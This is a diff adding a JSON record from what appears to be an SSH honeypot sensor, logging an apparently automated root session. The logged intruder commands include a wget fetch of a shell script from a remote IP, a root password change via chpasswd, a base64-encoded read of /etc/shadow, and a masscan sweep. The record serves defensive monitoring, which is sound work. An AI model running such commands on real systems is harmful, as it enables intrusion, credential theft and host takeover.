@@ -1,0 +1,173 @@
+{
+  "client": {
+    "arch": "linux-x64-lsb",
+    "hassh": "6372ee6957562199b2fb773b0be1bf34",
+    "pubkey_fingerprints": [],
+    "term": {
+      "height": 24,
+      "width": 80
+    },
+    "version": "SSH-2.0-paramiko_5.0.0"
+  },
+  "closed": true,
+  "commands": [
+    {
+      "failed": false,
+      "input": "uname -a",
+      "routes": [
+        "deterministic"
+      ],
+      "ts": "2026-09-21T11:21:03.086958+00:00"
+    },
+    {
+      "failed": false,
+      "input": "whoami",
+      "routes": [
+        "deterministic"
+      ],
+      "ts": "2026-09-21T11:21:03.407414+00:00"
+    },
+    {
+      "failed": false,
+      "input": "cat /etc/passwd | head -3",
+      "routes": [
+        "deterministic",
+        "deterministic"
+      ],
+      "ts": "2026-09-21T11:21:03.728095+00:00"
+    },
+    {
+      "failed": false,
+      "input": "echo 'root:[REDACTED]' | chpasswd",
+      "routes": [
+        "deterministic",
+        "privilege"
+      ],
+      "ts": "2026-09-21T11:21:04.049009+00:00"
+    },
+    {
+      "failed": false,
+      "input": "cd /tmp; wget http://198.51.100.23/bins/x86.sh",
+      "routes": [
+        "deterministic",
+        "deterministic"
+      ],
+      "ts": "2026-09-21T11:21:04.369777+00:00"
+    },
+    {
+      "failed": true,
+      "input": "masscan -p22 10.0.0.0/8 --rate 10000",
+      "routes": [
+        "escalate_candidate"
+      ],
+      "ts": "2026-09-21T11:21:04.690138+00:00"
+    },
+    {
+      "failed": false,
+      "input": "echo Y2F0IC9ldGMvc2hhZG93IHwgaGVhZCAtMQ== | base64 -d | bash",
+      "routes": [
+        "deterministic",
+        "deterministic",
+        "deterministic"
+      ],
+      "ts": "2026-09-21T11:21:05.010886+00:00"
+    },
+    {
+      "failed": false,
+      "input": "cat /etc/shadow | head -1",
+      "nested": true,
+      "routes": [
+        "privilege",
+        "deterministic"
+      ],
+      "ts": "2026-09-21T11:21:05.016132+00:00"
+    },
+    {
+      "failed": false,
+      "input": "sudo -l",
+      "routes": [
+        "privilege"
+      ],
+      "ts": "2026-09-21T11:21:05.330658+00:00"
+    },
+    {
+      "failed": false,
+      "input": "exit",
+      "routes": [
+        "deterministic"
+      ],
+      "ts": "2026-09-21T11:21:05.650998+00:00"
+    }
+  ],
+  "counts": {
+    "commands": 10,
+    "events": 36,
+    "failed_commands": 1,
+    "nested_commands": 1
+  },
+  "dst_port": 22,
+  "duration_s": 2.717,
+  "end_ts": "2026-09-21T11:21:05.753912+00:00",
+  "files": {
+    "downloads": [],
+    "uploads": []
+  },
+  "last_ts": "2026-09-21T11:21:05.753912+00:00",
+  "llm": {
+    "calls": 0,
+    "fallback": 0,
+    "gateway_unreachable": 0,
+    "generated": 0,
+    "latency_ms_total": 0,
+    "not_installed": 0,
+    "pinned": 0,
+    "refused": 0
+  },
+  "logins": {
+    "attempts": [
+      {
+        "password_hmac": "0e8d1bc3736a272cbfa36b53951cc83c",
+        "password_len": 11,
+        "success": true,
+        "ts": "2026-09-21T11:21:03.082702+00:00",
+        "username": "root"
+      }
+    ],
+    "n_failed": 0,
+    "n_success": 1,
+    "username": "root"
+  },
+  "protocol": "ssh",
+  "routes": {
+    "deterministic": 12,
+    "escalate_candidate": 1,
+    "privilege": 3
+  },
+  "sensor": "test-sensor",
+  "session": "5a9c7cb57d4f",
+  "source": "live",
+  "src_ip_hmac": "db19651c12bf2fde90dbcf1ed2435b45",
+  "src_prefix": "203.0.0.0/16",
+  "start_ts": "2026-09-21T11:21:03.036532+00:00",
+  "timing": {
+    "gap_mean_s": 0.320505,
+    "gap_std_s": 0.000338,
+    "gaps_s": [
+      0.320456,
+      0.320681,
+      0.320914,
+      0.320768,
+      0.320361,
+      0.320748,
+      0.319772,
+      0.32034
+    ],
+    "login_to_first_cmd_s": 0.004256,
+    "n_gaps": 8
+  },
+  "ttylog_shasum": "6a31f1ffa309d8d659baa918f4e82e8cfb7101fd3affda3309c4a547c44efb1d",
+  "urls": [
+    "http://198.51.100.23/bins/x86.sh"
+  ],
+  "version": 3
+}
